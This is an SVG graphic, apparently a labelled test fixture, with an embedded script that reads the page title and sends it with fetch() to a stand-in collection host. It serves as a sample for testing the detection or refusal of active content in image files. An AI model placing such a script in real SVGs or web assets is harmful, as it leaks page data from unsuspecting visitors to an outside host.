<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60" aria-hidden="true">
  <rect x="0" y="0" width="200" height="60" fill="currentColor" opacity=".1" />
  <script>
    /* Refusal fixture: the plain form. Reads the page, phones home. */
    fetch('https://example.invalid/collect?t=' + encodeURIComponent(document.title));
  </script>
</svg>
